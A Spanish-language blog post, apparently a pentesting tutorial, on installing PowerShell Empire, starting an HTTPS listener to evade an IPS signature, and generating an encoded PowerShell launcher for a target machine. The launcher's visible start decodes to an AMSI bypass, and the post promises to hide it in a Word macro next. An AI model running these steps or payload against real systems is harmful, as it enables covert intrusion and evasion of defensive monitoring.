---
layout: post
title: 'Empire F#ckery  — Pt. 01: Pentesting con Powershell y evasión de IPS'
date: '2017-08-05 13:28:26'
tags:
- powershell
- evasion
- framework
---

> Empire es una plataforma en Powershell de post-explotación construida con comunicaciones criptológicamente seguras y una architectura flexible
— [PowershellEmpire.com](https://www.powershellempire.com/)

Powershell es una excelente herramienta de ayuda en los sistemas windows que puede ser abusada por atacantes para cometer explotacion, post explotacion, recon e incluso BypassUAC, y es así como nace Empire.

![empire_logo_black4](/images/screenshots/empire_logo_black4.png)

Empire es una plataforma de post-explotación que nos asistirá a la hora de ingresar en un sistema y buscar elevar nuestra presencia ya sea en la maquina host como movimientos laterales sobre la red.

## Instalación de Empire

Afortunadamente Empire viene con un script de instalación muy práctico que hará el trabajo por nosotros. Para toda la instalación y las posteriores pruebas se usó: **Ubuntu 17.04 x64**.

Es tan simple como:
```
root@Attacker:~# git clone https://github.com/EmpireProject/Empire.git
root@Attacker:~# cd Empire/
root@Attacker:~/Empire# ./setup/install.sh
```

**Demo:**
# <script type="text/javascript" src="https://asciinema.org/a/HXBLiXYSFXUA7tNPxV4pVzsvc.js" id="asciicast-HXBLiXYSFXUA7tNPxV4pVzsvc" async></script>

Debemos poner atención a una de las últimas lineas. La linea `[*] Certificate written to ../data/empire.pem` nos dice donde guardará el certificado SSL para conexiónes seguras.

## El primer *"Listener"*

Un listener es un proceso que correrá en segundo plano, encargado de *escuchar* las conexiónes entrantes para determinar la conexión de un agente y diferenciarla de una conexión regular.

Para iniciar un listener debemos:
* Ejecutar Empire
* Ir a *listeners*
* Usar el modulo `userlistener http` el cual se encargara de escuchar con conexiones *https*
* Usualmente las opciones por defecto están bien en este caso, para verlas puedes ejecutar `info`. Para cambiar una configuración ejecutamos `set <opcion> <valor>`
* Escribimos `execute` para ejecutar el proceso

```
root@Attacker:~/Empire# ./empire
-- SNIP -- 
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name test
```

Ahora hay algo extremadamente importante antes de ejecutar el proceso, y es **añadir el certificado SSL** ya que sino hacemos esto podríamos ser detectados por un IDS/IPS o cualquier inspector de paquetes.

Por ejemplo, Fortinet agrego en Junio 01, 2017 una firma para detectar a Empire calificandolo como un backdoor.

![Intrusion Prevention: Backdoor.Empire](/images/screenshots/Capture-ips.PNG)

Si nosotros creamos un listener y nuestro agente se conecta a él, transmitirá la información en texto claro y el IPS/IDS levantará una alerta y bloqueará la conexión.

Para nosotros evadir este IPS debemos de configurar el certificado SSL que ya se creó en la instalación y añadirlo a la variable CertPath:

```
(Empire: listeners/http) > set CertPath data/
(Empire: listeners/http) > set Host https://<direccion_IP>:443
(Empire: listeners/http) > execute
[*] Starting listener 'test'
[+] Listener successfully started!
```

Y al final obtenemos nuestro codigo de inyección de powershell ejecutando `launcher powershell`:

```
(Empire: listeners/http) > launcher powershell
powershell -noP -sta -w 1 -enc
WwBSAEUARgBdAC4AQQBTAFMARQBNAGIATAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAGkARQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgB1AGwAbAAsACQAdA
--- SNIP ---
```

Esas lineas de código son las que debemos ejecutar en la máquina objectivo.

**Demo:**
# <script type="text/javascript" src="https://asciinema.org/a/5gkZHvi3baERqQJab26kTwYvX.js" id="asciicast-5gkZHvi3baERqQJab26kTwYvX" async></script>

En esta entrada cubrimos lo basico de configurar un listener y como conectar un agente a él, en la próxima entrada veremos los comandos esenciales de un agente, como hacer un launcher y ocultarlo en un archivo macro (en word por ejemplo) y otras cosas más.
